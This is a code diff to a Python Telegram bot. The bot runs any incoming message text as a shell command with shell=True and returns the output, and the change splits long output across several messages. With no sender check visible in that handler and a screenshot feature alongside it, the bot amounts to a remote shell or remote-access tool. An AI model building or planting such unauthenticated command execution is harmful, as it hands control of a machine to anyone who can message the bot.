@@ -54,17 +54,42 @@ async def screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 #Defining our echo function that takes care of all the messages
 async def echo(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    #This is to run the command in the shell
-    output = subprocess.check_output(update.message.text, shell=True).decode('utf-8')
+    command = update.message.text
 
-    #Printing out the output for debug purposes
-    print(output)
-    #TODO - The functionality to send long text
-    #If the output is empty send the response as "no output"
-    if(output):
+    # This is to run the command in the shell
+    output = subprocess.check_output(command, shell=True).decode('utf-8')
+
+    # Define the maximum length of each message (characters per message)
+    max_message_length = 4096
+
+    # If the output is shorter than the maximum message length, send it directly
+    if len(output) <= max_message_length:
         await context.bot.send_message(chat_id=update.effective_chat.id, text=output)
     else:
-        await context.bot.send_message(chat_id=update.effective_chat.id, text="no output")
+        # Split the output into chunks and send them as separate messages
+        while output:
+            if len(output) <= max_message_length:
+                await context.bot.send_message(chat_id=update.effective_chat.id, text=output)
+                break
+            else:
+                # Find the last occurrence of a newline character before the maximum message length
+                last_newline_index = output.rfind('\n', 0, max_message_length)
+
+                if last_newline_index != -1:
+                    # Cut the output at the last occurrence of a newline character before 4096 characters
+                    output_chunk = output[:last_newline_index]
+                    output = output[last_newline_index + 1:]
+                else:
+                    # If there's no newline before 4096 characters, cut it at exactly 4096 characters
+                    output_chunk = output[:max_message_length]
+                    output = output[max_message_length:]
+
+                # Send the chunk as a message
+                await context.bot.send_message(chat_id=update.effective_chat.id, text=output_chunk)
+
+    #Printing output for debug purposes
+    print(output)
+
 
 if __name__ == '__main__':
     #Api_Key goes here
